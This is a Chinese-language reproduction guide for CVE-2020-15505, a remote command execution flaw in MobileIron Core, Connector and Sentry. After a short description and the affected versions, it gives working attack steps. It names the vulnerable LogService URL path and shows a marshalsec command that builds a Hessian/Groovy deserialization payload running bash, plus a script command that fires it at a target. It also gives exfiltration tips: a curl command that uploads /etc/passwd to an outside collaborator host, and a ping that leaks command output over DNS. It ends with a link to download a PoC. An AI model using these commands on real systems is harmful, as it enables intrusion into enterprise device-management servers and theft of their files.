（CVE-2020-15505）MobileIron 远程命令执行漏洞
=============================================

一、漏洞简介
------------

MobileIron Sentry等都是美国思可信（MobileIron）公司的产品。MobileIron
Sentry是一款智能网关产品。MobileIron
Core是一款MobileIron平台的管理控制台组件。MobileIron
Connector是一款MobileIron平台的连接器组件。 MobileIron Core
10.6及之前版本、Connector 10.6及之前版本和Sentry
9.8及之前版本中存在安全漏洞。远程攻击者可利用该漏洞执行任意代码。

二、漏洞影响
------------

MobileIron Core 10.6及之前版本、Connector 10.6及之前版本和Sentry
9.8及之前版本

三、复现过程
------------

访问`https://www.0-sec.org/mifs/.;/services/LogService`

![5.png](./resource/(CVE-2020-15505)MobileIron远程命令执行漏洞/media/rId24.png)

确认存在该漏洞位置连接。

在vps执行

    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Groovy "/bin/bash" "-c" "<Command>" > exp.ser

![1.png](./resource/(CVE-2020-15505)MobileIron远程命令执行漏洞/media/rId25.png)

然后再执行

    python hessian.py -u 'https://target.0-sec.org/mifs/.;/services/LogService' -p exp.ser

![2.png](./resource/(CVE-2020-15505)MobileIron远程命令执行漏洞/media/rId26.png)

**dnslog 使用姿势补充**

    curl http://xxxxx.burpcollaborator.net -F "file=@/etc/passwd;"

    ping `whoami`.xxx.dnslog.cn"

![3.png](./resource/(CVE-2020-15505)MobileIron远程命令执行漏洞/media/rId27.png)

### poc

> https://download.0-sec.org/Web安全/MobileIron/CVE-2020-15505.zip

参考链接
--------

> https://github.com/iamnoooob/CVE-Reverse
